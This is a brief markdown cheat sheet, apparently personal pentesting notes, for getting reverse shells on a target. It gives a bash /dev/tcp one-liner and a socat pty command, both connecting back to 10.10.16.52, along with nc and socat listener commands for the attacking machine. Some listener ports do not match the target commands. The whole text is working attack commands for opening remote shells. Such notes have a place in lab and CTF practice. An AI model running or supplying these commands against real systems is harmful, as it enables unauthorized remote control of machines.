# Reverse-Shells

https://highon.coffee/blog/reverse-shell-cheat-sheet/

## Bash

### target

    bash -i >& /dev/tcp/10.10.16.52/81 0>&1

### attack machine

    nc -lvp 4444


## better shell

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

socat binary see https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64

### target
    ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.52:4444

### attack machine
    socat file:`tty`,raw,echo=0 tcp-listen:4445
